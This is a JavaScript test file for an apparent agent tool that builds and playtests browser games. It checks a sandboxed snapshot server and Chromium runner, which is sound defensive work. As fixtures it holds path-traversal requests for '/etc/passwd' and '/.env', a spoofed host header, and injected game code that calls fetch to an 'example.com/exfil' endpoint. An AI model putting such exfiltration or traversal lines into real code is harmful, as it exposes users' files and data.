// Real browser QA. Unit checks (server, PNG, env, root refusal) always run. The LIVE tests drive
// a real sandboxed Chromium through playwright-core and only run when ZUKUJS_LIVE_BROWSER=1 and
// the process is not root (Chromium's sandbox refuses root; we never pass --no-sandbox).
// Optional: ZUKUJS_TEST_CHROMIUM=/abs/path/to/chrome selects an installed browser.
import test from 'node:test';
import assert from 'node:assert/strict';
import { request } from 'node:http';
import { createRequire } from 'node:module';
import { serveSnapshot, PLAYTEST_CSP } from '../lib/agent/server.mjs';
import { decodePng, frameDifference, imageStats } from '../lib/agent/png.mjs';
import { createBrowserPlaytest, evaluatePlaytest, minimalBrowserEnv } from '../lib/agent/playtest.mjs';
import { GAME_FILES, PLAN, SCRIPT, makePng, sceneA, sceneB, blank } from './agent-fixtures.test.mjs';

const snapshotOf = files => ({ entry: 'index.html', files: new Map(Object.entries(files).map(([path, content]) => [path.replace(/^src\//, ''), Buffer.from(content)])) });
const get = (origin, path, headers = {}) => new Promise((resolve, reject) => {
  const url = new URL(origin);
  const req = request({ host: '127.0.0.1', port: url.port, path, method: 'GET', headers: { host: url.host, ...headers } }, res => {
    const chunks = [];
    res.on('data', chunk => chunks.push(chunk));
    res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks).toString() }));
  });
  req.on('error', reject);
  req.end();
});

test('snapshot server: loopback only, exact snapshot bytes, strict host, CSP and no traversal', async () => {
  const server = await serveSnapshot(snapshotOf(GAME_FILES).files, 'index.html');
  try {
    assert.match(server.origin, /^http:\/\/127\.0\.0\.1:\d+$/);
    const index = await get(server.origin, '/');
    assert.equal(index.status, 200);
    assert.equal(index.body, GAME_FILES['src/index.html']);
    assert.equal(index.headers['content-security-policy'], PLAYTEST_CSP);
    assert.match(PLAYTEST_CSP, /connect-src 'self'/);
    assert.match(PLAYTEST_CSP, /worker-src 'none'/);
    assert.equal(index.headers['x-content-type-options'], 'nosniff');
    assert.equal((await get(server.origin, '/main.js')).headers['content-type'], 'text/javascript; charset=utf-8');
    for (const path of ['/../zukujs.json', '/%2e%2e/x', '/.env', '/assets/../../etc/passwd', '/nope.js', '/%00']) assert.equal((await get(server.origin, path)).status, 404, path);
    assert.equal((await get(server.origin, '/', { host: 'evil.example:80' })).status, 421, 'DNS-rebinding host refused');
  } finally { await server.close(); }
});

test('png: decodes real screenshots and measures variety and frame change', () => {
  const image = decodePng(sceneA);
  assert.equal(image.width, 96);
  assert.ok(imageStats(sceneA).distinct_colors > 50);
  assert.ok(imageStats(blank).distinct_colors < 4);
  assert.ok(frameDifference(sceneA, sceneB) > 0.5);
  assert.equal(frameDifference(sceneA, sceneA), 0);
  assert.throws(() => decodePng(Buffer.from('not a png')));
  assert.throws(() => decodePng(makePng(2, 2, () => [0, 0, 0]).subarray(0, 40)));
});

test('browser env: minimal allowlist, throwaway HOME, no credentials', () => {
  const env = minimalBrowserEnv('/tmp/zukujs-browser-x', {
    PATH: '/usr/bin', LANG: 'ko_KR.UTF-8', HOME: '/home/me', ZUKUJS_ACCESS_TOKEN: 'secret', OPENAI_API_KEY: 'k', CODEX_HOME: '/home/me/.codex',
    AWS_SECRET_ACCESS_KEY: 's', GITHUB_TOKEN: 'g', SSH_AUTH_SOCK: '/tmp/ssh', NODE_OPTIONS: '--require x', HTTPS_PROXY: 'http://u:p@proxy',
  });
  assert.equal(env.HOME, '/tmp/zukujs-browser-x');
  assert.equal(env.PATH, '/usr/bin');
  for (const name of ['ZUKUJS_ACCESS_TOKEN', 'OPENAI_API_KEY', 'CODEX_HOME', 'AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN', 'SSH_AUTH_SOCK', 'NODE_OPTIONS', 'HTTPS_PROXY']) assert.equal(env[name], undefined, name);
  assert.ok(!Object.values(env).some(value => value.includes('/home/me')));
});

test('root: refuses to run the browser without its sandbox, before loading or launching anything', async () => {
  let loaded = false;
  const runner = createBrowserPlaytest({ uid: 0, loadPlaywright: async () => { loaded = true; return {}; } });
  await assert.rejects(runner.run({ snapshot: snapshotOf(GAME_FILES), plan: PLAN, script: SCRIPT }), { code: 'AGENT_PLAYTEST_SANDBOX' });
  assert.equal(loaded, false);
  const missing = createBrowserPlaytest({ uid: 1000, loadPlaywright: async () => { throw new Error('Cannot find package'); } });
  await assert.rejects(missing.run({ snapshot: snapshotOf(GAME_FILES), plan: PLAN, script: SCRIPT }), { code: 'AGENT_PLAYTEST_UNAVAILABLE' });
  const relative = createBrowserPlaytest({ uid: 1000, browserPath: 'chrome', loadPlaywright: async () => ({ chromium: { launch() {}, executablePath: () => '' } }) });
  await assert.rejects(relative.run({ snapshot: snapshotOf(GAME_FILES), plan: PLAN, script: SCRIPT }), error => error.details?.reason === 'browser_path_invalid');
});

test('abort while browser launch resolves closes it before creating a context or navigating', async () => {
  const controller = new AbortController();
  let contexts = 0, closes = 0;
  const browser = { newContext: async () => { contexts++; throw new Error('must not run'); }, close: async () => { closes++; }, version: () => 'fixture' };
  const chromium = { executablePath: () => process.execPath, launch: async () => { controller.abort(); return browser; } };
  const runner = createBrowserPlaytest({ uid: 1000, loadPlaywright: async () => ({ chromium }) });
  await assert.rejects(runner.run({ snapshot: snapshotOf(GAME_FILES), plan: PLAN, script: SCRIPT, signal: controller.signal }), { code: 'COMMAND_CANCELLED' });
  assert.equal(contexts, 0);
  assert.equal(closes, 1);
});

// ---------------------------------------------------------------------------------------------
const require = createRequire(import.meta.url);
const resolvable = id => { try { require.resolve(id); return true; } catch { return false; } };
const LIVE = process.env.ZUKUJS_LIVE_BROWSER === '1' && process.getuid?.() !== 0 && resolvable('playwright-core');
const live = LIVE ? test : test.skip;
const runner = () => createBrowserPlaytest({ browserPath: process.env.ZUKUJS_TEST_CHROMIUM || undefined, install: async () => { throw new Error('live tests never download browsers'); } });

live('LIVE chromium: the fixture game passes with observed input, reset and a real thumbnail', { timeout: 120_000 }, async () => {
  const obs = await runner().run({ snapshot: snapshotOf(GAME_FILES), plan: PLAN, script: SCRIPT });
  const verdict = evaluatePlaytest(obs, PLAN, SCRIPT);
  assert.deepEqual(verdict.failures, []);
  assert.equal(obs.browser.sandbox, true);
  assert.equal(obs.states.initial.status, 'menu');
  assert.equal(obs.states.after_start.last_action, 'start', 'start came from a real key press');
  assert.equal(obs.states.after_reset.last_action, 'reset');
  assert.ok(obs.states.after_reset.tick < obs.states.after_loss.tick);
  assert.notEqual(obs.dom.after_start['hud-score'].text, obs.dom.after_smoke['hud-score'].text);
  assert.equal(obs.dom.after_loss['menu-over'].visible, true);
  assert.deepEqual([decodePng(obs.thumbnail).width, decodePng(obs.thumbnail).height], [960, 540]);
});

live('LIVE chromium: hostile game cannot reach the network, workers or storage outside the sandbox', { timeout: 120_000 }, async () => {
  const files = {
    ...GAME_FILES,
    'src/index.html': GAME_FILES['src/index.html'].replace('</main>', '</main><img src="https://example.com/beacon.png" alt="">'),
    'src/main.js': GAME_FILES['src/main.js'] + `
fetch('https://example.com/exfil').catch(() => {});
try { new WebSocket('wss://example.com/ws'); } catch {}
navigator.serviceWorker?.register('sw.js').catch(() => {});
`,
  };
  const obs = await runner().run({ snapshot: snapshotOf(files), plan: PLAN, script: SCRIPT });
  const verdict = evaluatePlaytest(obs, PLAN, SCRIPT);
  assert.ok(obs.blocked_requests >= 2, `blocked ${obs.blocked_requests}`);
  assert.ok(verdict.failures.includes('PT_EXTERNAL_REQUEST'));
  assert.equal(verdict.passed, false);
});

live('LIVE chromium: broken game is caught from real errors and missing DOM', { timeout: 120_000 }, async () => {
  const files = {
    ...GAME_FILES,
    'src/index.html': GAME_FILES['src/index.html'].replace('<span id="hud-best">Best 0</span>', ''),
    'src/render.js': GAME_FILES['src/render.js'].replace("ctx.fillStyle = '#ff6b6b';", "ctx.fillStyle = '#ff6b6b'; if (state.tick > 30) undefinedFunction();"),
  };
  const obs = await runner().run({ snapshot: snapshotOf(files), plan: PLAN, script: SCRIPT });
  const verdict = evaluatePlaytest(obs, PLAN, SCRIPT);
  assert.equal(verdict.passed, false);
  assert.ok(verdict.failures.includes('PT_PAGE_ERROR'), verdict.failures.join());
});

const PHASER = LIVE && resolvable('phaser/package.json');
(PHASER ? test : test.skip)('LIVE chromium: phaser variant runs under the strict CSP with the local vendored bundle', { timeout: 120_000 }, async () => {
  const { resolvePhaser } = await import('../lib/agent/engine.mjs');
  const phaser = await resolvePhaser();
  assert.ok(phaser, 'phaser bundle resolvable');
  const render = `// Phaser renders simulation state; it never owns game rules.
const LANE = 640 / 3;
export function createRenderer(parent, getState) {
  class PlayScene extends Phaser.Scene {
    create() { this.graphics = this.add.graphics(); }
    update() {
      const state = getState();
      const g = this.graphics;
      g.clear();
      for (let lane = 0; lane < 3; lane++) { g.fillStyle(lane % 2 ? 0x1f2a48 : 0x22305a); g.fillRect(lane * LANE, 0, LANE, 360); }
      g.fillStyle(0xff6b6b);
      for (const block of state.blocks) g.fillRect(block.lane * LANE + 40, block.y, LANE - 80, 30);
      g.fillStyle(0xffd166);
      g.fillCircle(state.lane * LANE + LANE / 2, 315, 18);
    }
  }
  return new Phaser.Game({ type: Phaser.CANVAS, parent, width: 640, height: 360, backgroundColor: '#182038', scene: PlayScene, banner: false, audio: { noAudio: true } });
}
`;
  const main = GAME_FILES['src/main.js']
    .replace("import { draw } from './render.js';", "import { createRenderer } from './render.js';")
    .replace("const canvas = document.getElementById('stage');\nconst ctx = canvas.getContext('2d');\n", "createRenderer(document.getElementById('stage-host'), () => state);\n")
    .replace('  draw(ctx, state);\n', '');
  const files = {
    ...GAME_FILES, 'src/render.js': render, 'src/main.js': main,
    'src/index.html': GAME_FILES['src/index.html']
      .replace('<canvas id="stage" width="640" height="360" aria-label="Lane Dodger"></canvas>', '<div id="stage-host"></div>')
      .replace('<script type="module"', '<script src="vendor/phaser.min.js"></script>\n  <script type="module"'),
    'src/vendor/phaser.min.js': phaser.bytes,
  };
  const obs = await runner().run({ snapshot: snapshotOf(files), plan: PLAN, script: SCRIPT });
  const verdict = evaluatePlaytest(obs, PLAN, SCRIPT);
  assert.deepEqual(verdict.failures, [], (obs.error_samples ?? []).join(' | '));
});

live('LIVE end-to-end: zukujs agent (scripted model) → real sandboxed playtest → deterministic package', { timeout: 180_000 }, async t => {
  const { default: agent } = await import('../commands/agent.mjs');
  const { scriptedProvider, fakeDeploy, tmp } = await import('./agent-fixtures.test.mjs');
  const cwd = await tmp(t);
  const deploy = fakeDeploy();
  const result = await agent(['a three lane dodging game', '--yolo', ...(process.env.ZUKUJS_TEST_CHROMIUM ? ['--browser', process.env.ZUKUJS_TEST_CHROMIUM] : [])], {
    cwd, signal: new AbortController().signal, interactive: false, provider: scriptedProvider(), deploy, engine: null, stderr: { write() {} },
  });
  assert.equal(result.status, 'published');
  assert.equal(result.playtest.runner, 'chromium-sandboxed');
  assert.equal(result.playtest.browser.sandbox, true);
  assert.equal(deploy.calls.run.length, 1);
  assert.equal(decodePng((await import('node:fs')).readFileSync(deploy.calls.run[0].options.thumbnail.path)).width, 960);
});
